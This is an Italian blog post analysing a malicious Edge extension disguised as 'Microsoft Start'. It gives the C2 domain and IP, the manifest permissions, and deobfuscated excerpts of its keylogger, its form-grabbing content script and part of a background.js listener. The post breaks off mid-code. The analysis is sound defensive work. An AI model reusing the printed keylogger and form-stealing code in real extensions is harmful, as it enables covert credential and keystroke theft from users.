@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="it-IT">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="http://localhost:1313/favicon.svg" />
+<title>Anatomia di un&#39;estensione malevola per Edge | Alessio Maddaluno</title>
+<meta name="title" content="Anatomia di un&#39;estensione malevola per Edge" />
+<meta name="description" content="L&rsquo;antefatto, il fattaccio Tutto è cominciato da un avviso da MalwareBytes: un computer di casa stava tentando di comunicare con un dominio dal nome poco rassicurante, olive3451.com.
+La prima domanda è stata: &ldquo;e che roba è?&rdquo; ma soprattutto &ldquo;chi lo sta cercando di contattare?&rdquo;
+Facendo una semplice lookup con un server autoritativo il dominio risponde dietro ip 146.185.233.59.
+Con netstat è stato sufficiente intercettare le connessioni in uscita e verificare a quale processo appartenesse il PID 17104." />
+<meta name="keywords" content="reverse engineering," />
+
+
+<meta property="og:url" content="http://localhost:1313/anatomia-di-unestensione-malevola-per-edge/">
+  <meta property="og:site_name" content="Alessio Maddaluno">
+  <meta property="og:title" content="Anatomia di un&#39;estensione malevola per Edge">
+  <meta property="og:description" content="L’antefatto, il fattaccio Tutto è cominciato da un avviso da MalwareBytes: un computer di casa stava tentando di comunicare con un dominio dal nome poco rassicurante, olive3451.com.
+La prima domanda è stata: “e che roba è?” ma soprattutto “chi lo sta cercando di contattare?”
+Facendo una semplice lookup con un server autoritativo il dominio risponde dietro ip 146.185.233.59.
+Con netstat è stato sufficiente intercettare le connessioni in uscita e verificare a quale processo appartenesse il PID 17104.">
+  <meta property="og:locale" content="it_IT">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2026-07-08T21:19:50+02:00">
+    <meta property="article:modified_time" content="2026-07-08T21:19:50+02:00">
+    <meta property="article:tag" content="Reverse Engineering">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Anatomia di un&#39;estensione malevola per Edge">
+  <meta name="twitter:description" content="L’antefatto, il fattaccio Tutto è cominciato da un avviso da MalwareBytes: un computer di casa stava tentando di comunicare con un dominio dal nome poco rassicurante, olive3451.com.
+La prima domanda è stata: “e che roba è?” ma soprattutto “chi lo sta cercando di contattare?”
+Facendo una semplice lookup con un server autoritativo il dominio risponde dietro ip 146.185.233.59.
+Con netstat è stato sufficiente intercettare le connessioni in uscita e verificare a quale processo appartenesse il PID 17104.">
+
+
+
+
+  <meta itemprop="name" content="Anatomia di un&#39;estensione malevola per Edge">
+  <meta itemprop="description" content="L’antefatto, il fattaccio Tutto è cominciato da un avviso da MalwareBytes: un computer di casa stava tentando di comunicare con un dominio dal nome poco rassicurante, olive3451.com.
+La prima domanda è stata: “e che roba è?” ma soprattutto “chi lo sta cercando di contattare?”
+Facendo una semplice lookup con un server autoritativo il dominio risponde dietro ip 146.185.233.59.
+Con netstat è stato sufficiente intercettare le connessioni in uscita e verificare a quale processo appartenesse il PID 17104.">
+  <meta itemprop="datePublished" content="2026-07-08T21:19:50+02:00">
+  <meta itemprop="dateModified" content="2026-07-08T21:19:50+02:00">
+  <meta itemprop="wordCount" content="2269">
+  <meta itemprop="keywords" content="Reverse Engineering">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+  .highlight pre,
+  .code pre {
+    min-width: 100%;
+    width: max-content;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+
+<link rel="stylesheet" href="/css/site.min.fa26487b7ed6d1711c294bb8a6e6a1d45ba739e24bc5348248b0f154d06cf072.css" integrity="sha256-&#43;iZIe37W0XEcKUu4puah1FunOeJLxTSCSLDxVNBs8HI=">
+
+
+<link rel="stylesheet" href="/css/code.min.52f8f07ae8a65fca36957dfeb46b165df28347b9055106a18d891f7b3f4317ca.css" integrity="sha256-UvjweuimX8o2lX3&#43;tGsWXfKDR7kFUQahjYkfez9DF8o=">
+
+</head>
+
+<body>
+  <header><a href="/" class="title">Alessio Maddaluno</a>
+<nav>
+
+<a href="/">Home</a>
+
+<a href="/blog/">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>Anatomia di un&#39;estensione malevola per Edge</h1>
+<p>
+  <i>
+    <time datetime='2026-07-08'>
+      08 Jul, 2026
+    </time>
+  </i>
+</p>
+
+<content>
+  <p><img src="/images/reverse-engineering/anatomia-estensione-malevola-edge/codice_deoffuscato.png" alt="Codice Deoffuscato"></p>
+<h2 id="lantefatto-il-fattaccio">L&rsquo;antefatto, il fattaccio</h2>
+<p>Tutto è cominciato da un avviso da MalwareBytes: un computer di casa stava tentando di comunicare con un dominio dal nome poco rassicurante, <code>olive3451.com</code>.</p>
+<p>La prima domanda è stata: &ldquo;<em>e che roba è?</em>&rdquo; ma soprattutto &ldquo;<em>chi lo sta cercando di contattare?</em>&rdquo;</p>
+<p>Facendo una semplice lookup con un server autoritativo il dominio risponde dietro ip <code>146.185.233.59</code>.</p>
+<p>Con <code>netstat</code> è stato sufficiente intercettare le connessioni in uscita e verificare a quale processo appartenesse il PID <code>17104</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">netstat -ano <span class="p">|</span> findstr 146.185.233.59
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  TCP    192.168.1.173:53753   146.185.233.59:443   SYN_SENT   <span class="m">17104</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  TCP    192.168.1.173:63385   146.185.233.59:443   SYN_SENT   <span class="m">17104</span>
+</span></span></code></pre></div><p>La risposta è <code>msedge.exe</code>. Quindi non era un programma sospetto, era Edge. Il che significa una cosa sola: un&rsquo;estensione.</p>
+<p>Fun fact: sono utente Firefox da anni e su quel pc nessuno utilizza Edge, quindi ancora ora non ho idea di come ci sia finita lì.</p>
+<h2 id="individuiamo-il-colpevole">Individuiamo il colpevole</h2>
+<p>Le estensioni installate di Edge si trovano qui: <code>C:\Users\UTENTE\AppData\Local\Microsoft\Edge\User Data\Default\Extensions</code>.</p>
+<p>Fortunatamente, non utilizzandolo come browser principale, la cartella contiene solo 3 estensioni, dal nome del tutto comprensibile:</p>
+<pre tabindex="0"><code>cdchopjnflejmhmkbgiphbedppnapbjb
+ghbmnnjooekpmoecnnnilnnbdlolhkhi
+jmjflgjpcpepeafmmgdpfkogkghcpiha
+</code></pre><p>No, non ho schiacciato tasti a caso, si chiamano davvero così.</p>
+<p>Il modo più rapido per capire quale sia sospetta è leggere il <code>manifest.json</code>, un file che definisce un po&rsquo; di metadati dell&rsquo;estensione e soprattutto dichiara di quali permessi necessita.</p>
+<p>Due estensioni superano il test: chiedono pochi permessi e agiscono solo su domini specifici. La terza, <code>cdchopjnflejmhmkbgiphbedppnapbjb</code>, no. Si presenta come &ldquo;Microsoft Start&rdquo; ma richiede tantissimi permessi per tutti i siti:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="s2">&#34;permissions&#34;</span><span class="err">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="s2">&#34;cookies&#34;</span><span class="p">,</span> <span class="s2">&#34;scripting&#34;</span><span class="p">,</span> <span class="s2">&#34;history&#34;</span><span class="p">,</span> <span class="s2">&#34;tabs&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="s2">&#34;declarativeNetRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;webRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;storage&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="s2">&#34;clipboardRead&#34;</span><span class="p">,</span> <span class="s2">&#34;clipboardWrite&#34;</span><span class="p">,</span> <span class="s2">&#34;management&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="s2">&#34;privacy&#34;</span><span class="p">,</span> <span class="s2">&#34;browsingData&#34;</span><span class="p">,</span> <span class="s2">&#34;debugger&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="s2">&#34;system.cpu&#34;</span><span class="p">,</span> <span class="s2">&#34;system.memory&#34;</span><span class="p">,</span> <span class="s2">&#34;system.display&#34;</span><span class="p">,</span> <span class="s2">&#34;system.storage&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="s2">&#34;offscreen&#34;</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="p">]</span><span class="err">,</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="s2">&#34;host_permissions&#34;</span><span class="err">:</span> <span class="p">[</span> <span class="s2">&#34;&lt;all_urls&gt;&#34;</span> <span class="p">]</span>
+</span></span></code></pre></div><p>Ok che Microsoft è Microsoft, ma mi sembra un tantino eccessivo per un&rsquo;estensione che serve a <em>&ldquo;Sign in to supported websites with your Microsoft work or school accounts&rdquo;</em> richiedere questi permessi. Sempre nel <code>manifest.json</code> poco sotto troviamo il content_script che sostanzialmente va a definire per quali siti iniettare quale script javascript:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="s2">&#34;content_scripts&#34;</span><span class="err">:</span> <span class="p">[{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="nt">&#34;matches&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;&lt;all_urls&gt;&#34;</span> <span class="p">],</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nt">&#34;js&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;content.js&#34;</span> <span class="p">],</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="nt">&#34;run_at&#34;</span><span class="p">:</span> <span class="s2">&#34;document_end&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="nt">&#34;all_frames&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="p">}]</span>
+</span></span></code></pre></div><p>Quindi questo file chiamato <code>content.js</code> viene iniettato in tutte le pagine. Direi che possiamo concludere che il sospettato principale è proprio questa estensione.</p>
+<h2 id="le-due-parti-di-questestensione">Le due parti di quest&rsquo;estensione</h2>
+<p>Prima di sbattere la testa in temi ben più grandi di me, un promemoria su come è fatta un&rsquo;estensione moderna (Manifest V3). Nella cartella dell&rsquo;estensione sono presenti i seguenti file:</p>
+<pre tabindex="0"><code>background.js
+backup.js
+content.js
+icon.png
+manifest.json
+msgpack.min.js
+offscreen.html
+offscreen.js
+proxy.js
+</code></pre><p>Per capire cosa succede, a noi ne interessano due per il momento:</p>
+<ul>
+<li>Il <strong>content script</strong> (<code>content.js</code>), che da quanto abbiamo visto nel manifest, viene iniettato in <strong>ogni</strong> pagina web;</li>
+<li>Il <strong>service worker</strong> (<code>background.js</code>), una sorta di &ldquo;backend&rdquo; dell&rsquo;estensione che gira in disparte e che può parlare con la rete.</li>
+</ul>
+<p>Le due parti non condividono variabili ma comunicano tramite messaggi. Il content script invia messaggi al worker tramite <code>chrome.runtime.sendMessage(...)</code> e il service worker riceve con <code>chrome.runtime.onMessage</code>.</p>
+<p>Ma come &ldquo;chrome&rdquo;? Non stavamo su Edge? Sì, ma <code>chrome.runtime</code> non significa che l&rsquo;estensione sia fatta per Chrome. È il nome dello standard API per le estensioni usato da tutti i browser Chromium-based. Tecnicamente quindi quest&rsquo;estensione è compatibile con diversi altri browser.</p>
+<p>Ovviamente il codice è totalmente offuscato. Per renderlo leggibile ho usato webcrack, un deoffuscatore per JavaScript:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">webcrack content.js &gt; content-clean.js
+</span></span></code></pre></div><p><strong>N.B. In questo post non sarà condiviso integralmente il contenuto dei file per ovvie ragioni.</strong></p>
+<p>Questo file rappresenta il nostro punto d&rsquo;ingresso per l&rsquo;analisi.</p>
+<h3 id="contentjs-il-ladro">content.js: Il ladro</h3>
+<p>Deoffuscato, <code>content.js</code> rivela tre funzioni, tra le altre, con nomi decisamente eloquenti: <code>setupKeylogger()</code>, <code>hookForms()</code> e <code>hookInputs()</code>.</p>
+<h4 id="il-keylogger">Il keylogger</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">function</span> <span class="nx">setupKeylogger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;keydown&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="kr">const</span> <span class="nx">ignore</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;Meta&#34;</span><span class="p">,</span><span class="s2">&#34;Alt&#34;</span><span class="p">,</span><span class="s2">&#34;Control&#34;</span><span class="p">,</span><span class="s2">&#34;Shift&#34;</span><span class="p">,</span><span class="s2">&#34;CapsLock&#34;</span><span class="p">,</span><span class="s2">&#34;Tab&#34;</span><span class="p">,</span><span class="s2">&#34;Escape&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span> <span class="o">||</span> <span class="nx">ignore</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">))</span> <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">sendMessage</span><span class="p">({</span> <span class="nx">action</span><span class="o">:</span> <span class="s2">&#34;keypress&#34;</span><span class="p">,</span> <span class="nx">key</span><span class="o">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">key</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Resta in ascolto per tutti gli eventi <code>keydown</code> e scarta solo i modificatori (Ctrl, Alt) e così via.</p>
+<h4 id="il-ladro-dei-form">Il ladro dei form</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">form</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;submit&#34;</span><span class="p">,</span> <span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">action</span><span class="o">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">action</span><span class="p">,</span> <span class="nx">elements</span><span class="o">:</span> <span class="p">{}</span> <span class="p">};</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="kd">var</span> <span class="nx">fields</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">elements</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">fields</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">fields</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span> <span class="o">||</span> <span class="nx">fields</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">placeholder</span> <span class="o">||</span> <span class="nx">fields</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">type</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nx">out</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">fields</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>   <span class="c1">// il valore digitato
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">sendMessage</span><span class="p">({</span> <span class="nx">action</span><span class="o">:</span> <span class="s2">&#34;new-form&#34;</span><span class="p">,</span> <span class="nx">form</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nx">url</span><span class="o">:</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">out</span><span class="p">),</span> <span class="p">...</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="p">}});</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">},</span> <span class="kc">true</span><span class="p">);</span>
+</span></span></code></pre></div><p><code>hookForms()</code> mette un listener su ogni <code>&lt;form&gt;</code> della pagina. Al momento dell&rsquo;invio legge tutti i campi con i loro valori e li impacchetta.</p>
+<p>E nota bene, il valore viene letto <strong>prima</strong> che il browser lo cifri per l&rsquo;invio tramite HTTPS, quindi è tutto in chiaro.</p>
+<p>Per tutto ciò che non è un vero e proprio form, invece, c&rsquo;è <code>hookInputs()</code> che copre i singoli campi e ne cattura il valore quando clicchi fuori (<code>blur</code>) o quando premi <code>Enter</code>.</p>
+<p>Tutti questi bei dati vengono inviati al service worker tramite <code>chrome.runtime.sendMessage</code>.</p>
+<h3 id="backgroundjs-la-mente">background.js: La mente</h3>
+<p>Il service worker riceve i messaggi e coordina il resto. Ad alto livello riceve e smista i dati rubati dal content script, ma non solo.</p>
+<p>Il content script (keylogger, form, input) spedisce tutto con <code>sendMessage</code>. <code>background.js</code> riceve i messaggi attraverso dei listener, che non sono altro che delle funzioni a cui viene fatto un bind di uno specifico evento, in questo caso <code>onMessage</code>. Nel file ne troviamo due di questi listener, che rivelano qualcosa di ben più grave di un semplice info stealer:</p>
+<h4 id="il-listener-principale">Il listener principale</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">  1</span><span class="cl"><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">_0x5d76b4</span><span class="p">,</span> <span class="nx">_0x6e8f0b</span><span class="p">,</span> <span class="nx">_0x3df652</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">  2</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">==</span> <span class="s2">&#34;captureScreenshot&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">  3</span><span class="cl">    <span class="nx">captureScreenshot</span><span class="p">(</span><span class="nx">_0x19f520</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">  4</span><span class="cl">      <span class="nx">_0x3df652</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln">  5</span><span class="cl">        <span class="s1">&#39;screenshotUrl&#39;</span><span class="o">:</span> <span class="nx">_0x19f520</span>
+</span></span><span class="line"><span class="ln">  6</span><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="ln">  7</span><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="ln">  8</span><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">  9</span><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 10</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">==</span> <span class="s2">&#34;fetchConfig&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 11</span><span class="cl">      <span class="kd">let</span> <span class="nx">_0x5ecdb3</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="ln"> 12</span><span class="cl">      <span class="kd">let</span> <span class="nx">_0x13a322</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="ln"> 13</span><span class="cl">      <span class="kr">const</span> <span class="nx">_0x369ccc</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="mi">900000</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 14</span><span class="cl">      <span class="kr">const</span> <span class="nx">_0x279443</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="mi">600000</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 15</span><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">_0x139319</span> <span class="k">of</span> <span class="nx">CURRENT_CHECKERS</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 16</span><span class="cl">        <span class="kr">const</span> <span class="nx">_0x43c2c1</span> <span class="o">=</span> <span class="nx">_0x139319</span><span class="p">.</span><span class="nx">lastRunTime</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 17</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_0x43c2c1</span> <span class="o">||</span> <span class="nx">_0x43c2c1</span> <span class="o">&lt;</span> <span class="nx">_0x279443</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 18</span><span class="cl">          <span class="nx">_0x139319</span><span class="p">.</span><span class="nx">code</span> <span class="o">=</span> <span class="nx">_0x139319</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;REPORT_ID_PLACEHOLDER&#34;</span><span class="p">,</span> <span class="nx">STATIC_RID</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 19</span><span class="cl">          <span class="nx">_0x5ecdb3</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_0x139319</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 20</span><span class="cl">          <span class="nx">_0x139319</span><span class="p">.</span><span class="nx">lastRunTime</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 21</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 22</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 23</span><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">_0x12ab1f</span> <span class="k">of</span> <span class="nx">CURRENT_INJECTS</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 24</span><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">_0x479893</span> <span class="k">of</span> <span class="nx">_0x12ab1f</span><span class="p">.</span><span class="nx">target_urls</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 25</span><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">_0x479893</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 26</span><span class="cl">            <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 27</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 28</span><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">_0x12ab1f</span><span class="p">.</span><span class="nx">type</span> <span class="o">==</span> <span class="s2">&#34;grabber&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 29</span><span class="cl">            <span class="kr">const</span> <span class="nx">_0x5d8a9e</span> <span class="o">=</span> <span class="nx">_0x12ab1f</span><span class="p">.</span><span class="nx">lastRun</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 30</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d8a9e</span> <span class="o">&amp;&amp;</span> <span class="nx">_0x5d8a9e</span> <span class="o">&gt;</span> <span class="nx">_0x369ccc</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 31</span><span class="cl">              <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 32</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 33</span><span class="cl">            <span class="nx">_0x12ab1f</span><span class="p">.</span><span class="nx">lastRun</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 34</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 35</span><span class="cl">          <span class="nx">_0x13a322</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_0x12ab1f</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 36</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 37</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 38</span><span class="cl">      <span class="kd">var</span> <span class="nx">_0x1d96dd</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;input[type=\&#34;password\&#34;]&#34;</span><span class="p">];</span>
